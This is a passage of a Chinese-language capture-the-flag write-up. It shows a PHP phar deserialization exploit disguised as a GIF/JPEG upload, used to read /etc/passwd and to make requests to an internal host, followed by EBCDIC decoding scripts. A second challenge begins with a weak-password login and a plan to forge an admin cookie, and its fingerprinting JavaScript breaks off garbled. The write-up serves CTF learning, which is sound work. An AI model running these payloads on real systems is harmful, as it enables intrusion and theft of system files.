            echo $this->why->httpGet($this->url);
        }
    }
    $phar = new Phar("zedd.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a" . ""); //设置stub
    $o = new MainClass();
    $o->url = "file:///etc/passwd";
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); 
        //签名自动计算
    $phar->stopBuffering();
    ?>
修改后缀名为 .jpeg
，通过访问`phar://uploads/f68caba0b9.jpeg/test.txt`，成功获得了`file:///etc/passwd`的内容。
但是我们如何找 flag 呢，这里其实是比较坑的一个点，其实基本漏洞利用点已经找到了，接下来其实感觉是有些多余的出题设置，通过试探一些常用的 flag
目录路径，都没有找到 flag ，而后在`/etc/hosts`发现了同一个网段的另一台主机。
如图中的`192.168.32.2 7eaef799a0b8`，猜想是不是在 192.168.32.0/24 这个段上，或者比较靠前的机器上，当尝试到
192.168.32.3 时，发现有不寻常的返回。
看着有点像用 python 加密出来的东西，搜了一下发现是使用了一个叫`ebcdic`的 python 库，用了`cp1047`编码。
解码脚本：
    import ebcdic
    blob=b'xc8x85x93x93x96@ax86x85xa3x83x88xa1lxadxbd_|]M@@x94x85'
    print(blob.decode("cp1047"))
得到`Hello /fetch~%[]^@)( me`
感觉是个 url 之类的，再构造 phar 包，访问 `http://192.168.32.3/fetch~%25%5B%5D%5E%40)(`，得到
看起来是同样的加密，直接解密就可以了。
    import ebcdic
    blob=b'xc6x93x81x87xc0xd7xc8xd7mxe2xa3x99x85x81x94xa2mx81x99x85mxa3xf0xf0mxd4x81x89x95xe2xa3x99x85x81x94xf0xd0'
    print(blob.decode("cp1047"))
最后得到 flag
###  credz
> ​ Alice is a admin of abc company in india. He knows about hackers and makes
> a system that can login only from his system and only his browser which is
> chrome.
>
>   * Hint: ummm maybe that image has something to do with it.
>   * Hint2: Admin is uses fresh chrome
>   * Hint3: admin has different CanvasFingerprint
>   * Hint4: Windows 10 64 bit
>
题目设置为一个登陆界面，并且有一行注释
尝试了一下 sql 注入，并没有注入点，在尝试弱密码的时候使用`admin/admin`登录成功，但是页面提示
很直接，让我们伪造 admin 的 cookie ，这就需要我们另寻突破口了，在主页面发现一个貌似用来设置 cookie 的 js 文件：
Fps.js
    (function(name, context, definition) {
        if (typeof module !== 'undefined' && module.exports) {
            module.exports = definition()
        } else if (typeof define === 'function' && define.amd) {
            define(definition)
        } else {
            context[name] = definition()
        }
    })('fpbrowser_v1', this, function() {
        'use strict';
        var Fingerprint = function(options) {
            var nativeForEach, nativeMap;
            nativeForEach = Array.prototype.forEach;
            nativeMap = Array.prototype.map;
            this.each = function(obj, iterator, context) {
                if (obj === null) {
                    return
                }
                if (nativeForEach && obj.forEach === nativeForEach) {
                    obj.forEach(iterator, context)
                } else if (obj.length === +obj.length) {
                    for (var i = 0, l = obj.length; i >> 16) * c1) & 0xffff) >> 17);
                    k1 = ((((k1 & 0xffff) * c2) + ((((k1 >>> 16) * c2) & 0xffff) >> 19);
                    h1b = ((((h1 & 0xffff) * 5) + ((((h1 >>> 16) * 5) & 0xffff) << 16))) & 0xffffffff;